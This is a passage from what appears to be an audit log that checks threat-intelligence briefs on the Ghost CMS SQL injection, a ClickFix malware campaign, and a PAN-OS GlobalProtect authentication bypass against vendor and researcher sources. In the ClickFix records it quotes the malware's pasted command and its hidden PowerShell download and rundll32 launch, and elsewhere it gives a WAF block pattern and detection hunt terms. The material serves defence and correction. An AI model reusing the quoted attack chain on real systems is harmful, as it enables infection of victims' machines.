  - entry: 2026-05-25/cve-2026-26980-ghost-cms-content-api-unauthenticated-blind-s
    verdict: factual-error
    defects:
    - where: body para 1
      claim: the fix shipped in **6.19.1 on 19 February 2026**
      defect: Vendor release and advisory are dated 2026-02-16; 19 Feb is the date BleepingComputer/XLab use for public disclosure,
        not the release.
      ground_truth: 'GitHub release v6.19.1 ''Fixed SQL injection in Content API slug filter ordering'' published 2026-02-16T16:54:09Z;
        GHSA-w52v-v783-gw97 published 2026-02-16T18:04Z; SecurityWeek: ''February 16, the day a patch was announced''.'
      ground_truth_url: https://github.com/TryGhost/Ghost/releases/tag/v6.19.1
      fix: Write 'fixed in 6.19.1, released 2026-02-16 (CVE published 2026-02-20)'.
      class: factual-error
    - where: body para 1
      claim: Ghost **3.24.0 through 6.19.0** (a roughly three-year release range)
      defect: 'Wrong quantifier: Ghost 3.24.0 was released in July 2020, about 5.6 years before 6.19.0 (Feb 2026).'
      ground_truth: 'GitHub release 3.24.0 shows ''released this 10 Jul'' and its linked issue #12026 was opened 2020-07-09
        and closed 2020-07-10.'
      ground_truth_url: https://github.com/TryGhost/Ghost/releases/tag/3.24.0
      fix: Drop the parenthetical or say 'roughly five and a half years of releases'.
      class: factual-error
    - where: body para 1
      claim: Ghost(Pro) cloud instances were patched server-side; self-hosted operators must upgrade themselves
      defect: No cited or fetched source (BleepingComputer, XLab, GHSA, SecurityWeek, SentinelOne, Ghost forum) says anything
        about Ghost(Pro) or server-side patching; BleepingComputer says only that 'many sites failed to install the security
        update'. The 'self-hosted' qualifier in the summary is likewise unsourced.
      ground_truth: 'BleepingComputer: ''Although the fix for the issue was released on February 19 in Ghost CMS version 6.19.1,
        many sites failed to install the security update.'''
      ground_truth_url: https://www.bleepingcomputer.com/news/security/ghost-cms-sql-injection-flaw-exploited-in-large-scale-clickfix-campaign/
      fix: Delete the Ghost(Pro) sentence and the word 'self-hosted' unless a Ghost statement is found.
      class: factual-error
    - where: body para 2
      claim: SentinelOne documented in-the-wild exploitation as early as 27 February, and XLab confirmed the present large-scale
        wave (700+ compromised domains) on 21 May ([XLab Qianxin, 2026-05-21])
      defect: The citation terminates on XLab, which never mentions SentinelOne or 27 February; the SentinelOne page itself
        (published and last modified 2026-02-20) contains generic vulnerability and detection text and no in-the-wild exploitation
        report; SecurityWeek reads it as a warning ('SentinelOne warned that the vulnerability ... can be exploited'). 700+
        domains were identified by 2026-05-17; 05-21 is XLab's publication date.
      ground_truth: 'SentinelOne vulnerability-database page: ''CVE-2026-26980 published to NVD 2026-02-20; Last updated 2026-02-20'';
        no exploitation observation. XLab timeline: ''2026-05-17: Second Round of Compromised Site Enumeration Completed: 700+
        victim domains confirmed''.'
      ground_truth_url: https://www.sentinelone.com/vulnerability-database/cve-2026-26980/
      fix: Drop the SentinelOne 27-Feb exploitation claim (or cite an actual SentinelOne exploitation report), and date the
        700+ count to XLab's 2026-05-17 enumeration.
      class: factual-error
    - where: body para 1 (cited to GHSA)
      claim: boolean-based blind extraction of arbitrary database contents — critically the **admin API key**, which then grants
        full content-management scope over articles, themes and users ([GitHub Security Advisory GHSA-w52v-v783-gw97])
      defect: 'GHSA says only ''read arbitrary data from the database'' and that an attacker can ''gain access to a site''s
        API keys''; the admin-key scope is XLab/BleepingComputer content and ''boolean-based blind'' appears in no fetched source
        (SentinelOne: slug values concatenated into a SQL CASE ordering clause).'
      ground_truth: 'GHSA: ''A SQL injection vulnerability existed in Ghost''s Content API that allowed unauthenticated attackers
        to read arbitrary data from the database.'''
      ground_truth_url: https://github.com/advisories/GHSA-w52v-v783-gw97
      fix: Cite XLab/BleepingComputer for the admin-key scope; replace 'boolean-based blind' with 'SQL injection in the slug-filter
        ordering clause'.
      class: imprecision
    - where: body para 2 (interim controls)
      claim: restrict or disable the public Content API to trusted origins; the vendor mitigation targets exactly that request
        pattern
      defect: The vendor says there is no application-level workaround and that restricting key access does not mitigate; its
        only interim control is a reverse-proxy/WAF block on slug:[ / slug%3A%5B, which 'may break legitimate slug filter functionality'.
      ground_truth: '''There is no application-level workaround. The Content API key is public by design, so restricting key
        access does not mitigate this vulnerability. As a temporary mitigation, a reverse proxy or WAF rule can be used to block
        Content API requests containing slug%3A%5B or slug:[ ...'''
      ground_truth_url: https://github.com/advisories/GHSA-w52v-v783-gw97
      fix: State the WAF rule and its side effect; drop 'restrict or disable the public Content API to trusted origins'.
      class: imprecision
    - where: frontmatter
      claim: 'cvss: 9.4; classification absent; techniques: []; cves[].affected/fixed null; evidence quote publisher ''ctipilot
        v2 brief (migrated)'''
      defect: 9.4 is GitHub's (CNA) CVSS 3.1 score and matches; NVD's own score is 7.5 (C:H/I:N/A:N) and the entry never says
        which is which. No Admiralty rating, no techniques, no structured affected/fixed; the evidence is the entry's own text.
      ground_truth: 'NVD API: cvssMetricV31 security-advisories@github.com 9.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L);
        nvd@nist.gov 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N). Not in CISA KEV (catalogue of 2026-10-16).'
      ground_truth_url: https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-26980
      fix: Name the scorer ('9.4 per GitHub CNA; NVD 7.5'), set affected 3.24.0 to 6.19.0 and fixed 6.19.1, add classification
        and techniques.
      class: imprecision
  - entry: 2026-05-25/ghost-cms-cve-2026-26980-clickfix-the-cms-compromise-to-endp
    verdict: factual-error
    defects:
    - where: summary / body para 1 (Background)
      claim: CVE-2026-26980 was disclosed and patched in Ghost 6.19.1 on 19 February 2026, and SentinelOne reported in-the-wild
        exploitation and detection guidance by 27 February ([BleepingComputer, 2026-05-24])
      defect: 'Repeats BleepingComputer''s dates against the vendor record: release and advisory 2026-02-16 (CVE published 2026-02-20).
        The SentinelOne page BleepingComputer links is dated 2026-02-20 and holds no exploitation report.'
      ground_truth: GitHub release v6.19.1 published 2026-02-16T16:54:09Z; GHSA published 2026-02-16; SentinelOne page published/modified
        2026-02-20 with only generic detection guidance.
      ground_truth_url: https://github.com/TryGhost/Ghost/releases/tag/v6.19.1
      fix: Say 'fixed in 6.19.1 on 2026-02-16' and drop or re-source the SentinelOne exploitation-by-27-Feb claim.
      class: factual-error
    - where: Kill chain, user execution bullet
      claim: '**User execution — [`T1204.002`] User Execution: Malicious File, chained to T1059.001 PowerShell / T1059.003 Windows
        Command Shell.**'
      defect: ClickFix (user pastes a command) maps to T1204.004 Malicious Copy and Paste, active in ATT&CK v20; the user never
        opens a malicious file (update.zip is downloaded silently by page script).
      ground_truth: 'ATT&CK dataset: T1204.004 ''Malicious Copy and Paste'' active; XLab: ''sets a function that will execute
        with a delay of at least 500 milliseconds ... to secretly download malicious files in the background ... update.zip''.'
      ground_truth_url: https://blog.xlab.qianxin.com/ghost-cms-mass-compromised-via-cve-2026-26980-now-fueling-clickfix-attacks/
      fix: Replace T1204.002 with T1204.004 and record it in techniques[].
      class: imprecision
    - where: Kill chain, payload delivery bullet
      claim: The pasted command pulls follow-on payloads
      defect: 'The pasted command does not download: the lure page silently downloads update.zip; the command moves it, extracts
        it with tar and starts update.bat, and update.bat''s hidden PowerShell downloads the DLL that rundll32 then runs (exported
        function Begin).'
      ground_truth: 'XLab: pasted command ''move %USERPROFILE%\Downloads\update.zip %TEMP%\u.zip && tar -xf %TEMP%\u.zip -C
        %TEMP% && start /min "" %TEMP%\update.bat''; update.bat ''powershell -W 1 -C ... iwr ... Start-Process rundll32 -ArgumentList
        $f,''Begin'' -Window Hidden''.'
      ground_truth_url: https://blog.xlab.qianxin.com/ghost-cms-mass-compromised-via-cve-2026-26980-now-fueling-clickfix-attacks/
      fix: Describe the observed chain (cmd /c move + tar + start of a batch file from %TEMP%, hidden PowerShell download, hidden
        rundll32 calling an exported function) and use it as the detection anchor instead of generic mshta/certutil cradles.
      class: imprecision
    - where: Detection concepts (client-side) and Hardening (Ghost)
      claim: Sysmon Event ID 1 / Windows 4688 for cmd.exe or powershell.exe (especially with -EncodedCommand, clipboard-paste
        context, mshta, curl/certutil download cradles) ... restrict the public Content API to trusted origins
      defect: The hunt list names behaviors XLab did not observe (-EncodedCommand, mshta, certutil) and omits those it did (tar
        -xf into %TEMP%, start /min of update.bat, powershell -W 1 iwr, hidden rundll32 with an exported entry point); the Ghost
        mitigation repeats 'restrict the Content API', which the vendor says does not mitigate.
      ground_truth: 'GHSA: ''There is no application-level workaround. The Content API key is public by design, so restricting
        key access does not mitigate this vulnerability.'''
      ground_truth_url: https://github.com/advisories/GHSA-w52v-v783-gw97
      fix: Align detection with the XLab-observed process chain and the vendor WAF-only mitigation.
      class: imprecision
    - where: frontmatter
      claim: evidence quote 'Background.'; techniques absent; classification absent; summary is only the Background paragraph
      defect: The single evidence record is the word 'Background.' (migration residue); no ATT&CK mapping in metadata despite
        a full kill chain in the body; no rating; the summary tells a reader nothing about the campaign.
      ground_truth: n/a (metadata).
      ground_truth_url: https://blog.xlab.qianxin.com/ghost-cms-mass-compromised-via-cve-2026-26980-now-fueling-clickfix-attacks/
      fix: Fold into the survivor; add techniques T1190, T1659, T1480, T1204.004, T1059.001/.003, T1105 and a real summary.
      class: imprecision
  - entry: 2026-05-30/cve-2026-0257-pan-os-globalprotect-pre-auth-vpn-authenticati
    verdict: factual-error
    defects:
    - where: body, 'Affected and patched versions'
      claim: 'Affected: PAN-OS 10.2.x < 10.2.7-h34 (and maintenance tracks), 11.1.x < 11.1.4-h33, 11.2.x < 11.2.4-h17, 12.1.x
        < 12.1.4-h6. Not affected: Panorama, Cloud NGFW, Prisma SD-WAN, PA-Series managed by Panorama with no local GP config,
        PAN-OS < 10.2.x (EOL). ... Prisma Access 10.2 and 11.2: Palo Alto is rolling fixes; check Prisma Access status portal.'
      defect: Wrong boundaries and carve-outs. Affected means below the fixed build of each train (12.1 below 12.1.4-h6 and
        12.1.7; 11.2 below 11.2.4-h17, 11.2.7-h14, 11.2.10-h7, 11.2.12; 11.1 up to below 11.1.15; 10.2 up to below 10.2.18-h6),
        so a single boundary such as '11.1.x < 11.1.4-h33' clears the whole 11.1.5-11.1.14 range. Only Panorama and Cloud NGFW
        are stated as not impacted; Prisma Access 10.2/11.2 IS affected with named fixed builds; older unsupported PAN-OS is
        told to upgrade, not declared unaffected; Prisma SD-WAN and Panorama-managed carve-outs appear in no source.
      ground_truth: 'PSIRT CVE record: PAN-OS affected from 12.1.0, 11.2.0, 11.1.0, 10.2.0; Prisma Access 10.2.0 <10.2.10-h36
        and 11.2.0 <11.2.7-h13; ''Panorama and Cloud NGFW are not impacted by these issues''; Solution: ''All older unsupported
        PAN-OS versions: Upgrade to a supported fixed version.'''
      ground_truth_url: https://security.paloaltonetworks.com/json/CVE-2026-0257
      fix: 'Replace with the vendor''s per-train table (fixed: 12.1.4-h6/12.1.7; 11.2.4-h17/11.2.7-h14/11.2.10-h7/11.2.12; 11.1.4-h33/11.1.6-h32/11.1.7-h6/11.1.10-h25/11.1.13-h5/11.1.15;
        10.2.7-h34/10.2.10-h36/10.2.13-h21/10.2.16-h7/10.2.18-h6; Prisma Access 10.2.10-h36, 11.2.7-h13) and drop the invented
        carve-outs.'
      class: factual-error
    - where: body, 'Exploitation pattern'
      claim: The gap between the exploitation waves (18 and 21 May) and the PoC/KEV date (29 May) implies the actor possessed
        private pre-disclosure knowledge of the vulnerability.
      defect: 'Contradicted by the timeline: Palo Alto published the advisory and first-wave fixes on 2026-05-13, four days
        before the first observed exploitation (2026-05-17); exploitation preceded the PoC/KEV date but followed public disclosure,
        so ''pre-disclosure knowledge'' is unsupported.'
      ground_truth: 'PSIRT timeline ''Initial publication'' 2026-05-13T16:00Z; Rapid7: ''On May 13, 2026, Palo Alto Networks
        published a security advisory ... The earliest date for observed exploitation was May 17, 2026.'' Arctic Wolf: ''first
        publicly disclosed by Palo Alto Networks on May 13, 2026''.'
      ground_truth_url: https://www.rapid7.com/blog/post/etr-rapid7-observed-exploitation-of-pan-os-globalprotect-authentication-bypass-vulnerability-cve-2026-0257/
      fix: Delete the sentence or say exploitation began four days after the advisory and about twelve days before the public
        PoC.
      class: factual-error
    - where: body, 'Background'
      claim: Palo Alto's own security advisories (AA23-250A, AA24-075A) have repeatedly highlighted GlobalProtect as a target
        surface; this vulnerability is the most directly exploitable advisory in that series.
      defect: AA23-250A is a CISA/FBI/CNMF joint advisory on CVE-2022-47966 (Zoho) and CVE-2022-42475 (FortiOS) that does not
        mention Palo Alto or GlobalProtect; AA24-075A does not resolve (404). They are not Palo Alto advisories, and 'most directly
        exploitable' has no source.
      ground_truth: 'CISA AA23-250A: ''Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475'' (2023-09-07);
        neither Palo Alto Networks nor GlobalProtect appears on the page. https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-075a
        returns HTTP 404.'
      ground_truth_url: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-250a
      fix: Delete the sentence.
      class: factual-error
    - where: body, 'Vulnerability mechanics' and 'Hardening / mitigation'
      claim: issue signed cookies ... uses that same certificate to sign and encrypt session tokens ... (b) generate a dedicated
        certificate for GlobalProtect used exclusively for that service and not shared with the HTTPS management or any other
        feature
      defect: The cookie is RSA-encrypted with the certificate and decrypted with no signature check (that is the flaw); the
        cookie certificate must be a separate certificate used only for authentication-override cookies, not a dedicated certificate
        for the GlobalProtect service, so mitigation (b) as written can leave the cookie certificate shared with the portal/gateway
        HTTPS service and the host exploitable.
      ground_truth: 'Vendor workaround: ''Generate a new certificate exclusively for authentication override cookies and store
        it securely. Do not reuse the portal or gateway certificate, and do not share this certificate with other features or
        users.'' Rapid7: ''decrypted using a private key. The decrypted content is then trusted implicitly, with no signature
        verification of any kind occurring after decryption.'''
      ground_truth_url: https://security.paloaltonetworks.com/json/CVE-2026-0257
      fix: Say 'use a dedicated certificate exclusively for authentication-override cookies, distinct from the portal/gateway
        HTTPS certificate' and drop 'signed'.
      class: factual-error
    - where: body, 'Hardening / mitigation' (a)
      claim: disable authentication override cookies entirely in the GlobalProtect gateway and portal settings (`Authentication`
        > `No Cookie Required on Pre-Logon Connections`)
      defect: Invented UI path; the vendor's instruction is to uncheck the Authentication Override options (generate and accept
        cookie) on the portal agent configuration and gateway client settings. The 24-hour trigger and the `show system info`
        / `show sslmgr-store` verification step appear in no source.
      ground_truth: '''Disable Authentication Override: Uncheck the Authentication Override options (for generating and accepting
        cookies) in the GlobalProtect portal and gateway configuration.'' Portal path: Network > GlobalProtect > Portals > Agent
        > Authentication; Gateway: Network > GlobalProtect > Gateways > Agent > Client Settings > Authentication Override.'
      ground_truth_url: https://security.paloaltonetworks.com/json/CVE-2026-0257
      fix: Use the vendor's checkboxes and paths; delete the unsourced verification commands.
      class: factual-error
    - where: body, 'MITRE ATT&CK mapping' and 'Exploitation pattern'
      claim: 'Lateral movement: T1021.001 (... expected next step once inside the network segment); T1046 (Network Service Discovery
        — attacker-controlled GP-CLIENT enumerating accessible segments). / Both used a deliberately spoofed, easily-recognisable
        MAC address pattern — suggesting deliberate source-normalisation to defeat MAC-based network anomaly detection.'
      defect: Rapid7 and Unit 42 report no lateral movement or post-access behaviour; GP-CLIENT enumeration and RDP are invented.
        The MAC-evasion purpose is the entry's own speculation (the same MAC and a Windows 10 Pro client string are hard-coded
        in the public PoC per Unit 42). Forged cookies map to T1606.001 / T1550.004 rather than T1539 (theft); T1036.005 for
        a machine name is unsupported.
      ground_truth: 'Rapid7: ''we did not observe any indication of successful lateral movement from the devices''; Unit 42:
        ''No post-access behavior or lateral movement has been identified as of this time''; ''search ... matching the following
        hard-coded client configuration values from the PoC code''.'
      ground_truth_url: https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/
      fix: Map only T1190/T1133 and T1606.001 (forged auth-override cookie); delete T1021.001, T1046, T1036.005 and the evasion-intent
        sentence.
      class: factual-error
    - where: body, 'Vulnerability mechanics'
      claim: shares an X.509 certificate with another co-hosted service — most commonly the HTTPS management or captive-portal
        service ... a configuration that has historically been documented in Palo Alto's own deployment guides as a shortcut
        for certificate management
      defect: Rapid7 names the portal/gateway HTTPS service as the example; 'management or captive-portal service', 'most commonly'
        and the claim about Palo Alto deployment guides have no source; also the 'only pre-condition' sentence omits that authentication
        override cookies must be enabled, which is not a default.
      ground_truth: 'Rapid7: ''reused the certificate for encrypting and decrypting cookies with another feature, such as the
        HTTPS service of the portal or gateway''; ''This is not a feature that is enabled by default.'' PSIRT: ''applies ...
        when authentication override cookies are enabled and a specific certificate configuration exists.'''
      ground_truth_url: https://www.rapid7.com/blog/post/etr-rapid7-observed-exploitation-of-pan-os-globalprotect-authentication-bypass-vulnerability-cve-2026-0257/
      fix: Restate the two preconditions (override cookies enabled; cookie certificate reused for the portal/gateway HTTPS service)
        and drop the deployment-guide claim.
      class: imprecision
    - where: body, 'Detection'
      claim: 'PAN-OS system logs: `globalprotectgateway-config-succ` events authenticated via cookie from non-enrolled endpoints
        (no prior SCEP or Panorama device-cert association).'
      defect: No fetched source names this log event or the SCEP/device-cert discriminator; what the sources do give are cookie
        logins to the local admin account (generic or default hostnames) and POSTs to /ssl-vpn/getconfig.esp and /ssl-vpn/hipreport.esp
        for sessions that were established.
      ground_truth: 'Rapid7: ''suspicious cookie authentication to the local admin account''; ''POST requests to /ssl-vpn/hipreport.esp
        and /ssl-vpn/getconfig.esp in the cases where a VPN tunnel was successfully established''.'
      ground_truth_url: https://www.rapid7.com/blog/post/etr-rapid7-observed-exploitation-of-pan-os-globalprotect-authentication-bypass-vulnerability-cve-2026-0257/
      fix: Anchor detection on cookie-method gateway-auth logins to the local admin account from hosting-provider IPs with generic
        client names, then the two ESP requests.
      class: imprecision
    - where: body, 'Exploitation pattern' and state
      claim: Wave 1 (18 May) ... Rapid7 observed successful VPN session establishment but no confirmed lateral movement
      defect: 'Rapid7''s earliest observed exploitation is 2026-05-17 (18 May is the alert time of the log shown). The entry
        is also stale today: Arctic Wolf reports a larger wave from 2026-05-30 with Impacket-style SMB/NTLM activity after tunnel
        establishment, and CISA''s KEV now flags the CVE as used in ransomware campaigns (Arctic Wolf attributes June intrusions
        to Qilin); none of this is in the entry (it lives in the twin entry).'
      ground_truth: 'Rapid7: ''The earliest date for observed exploitation was May 17, 2026.'' Arctic Wolf (2026-06-11): ''increase
        ... began on May 30, 2026 ... follow-on Impacket activity soon after VPN tunnel establishment''. KEV: knownRansomwareCampaignUse
        ''Known''.'
      ground_truth_url: https://arcticwolf.com/resources/blog/arctic-wolf-observes-increase-in-palo-alto-networks-globalprotect-authentication-bypass-exploitation-via-cve-2026-0257/
      fix: Fold into the survivor carrying the later exploitation and ransomware facts.
      class: imprecision
    - where: frontmatter
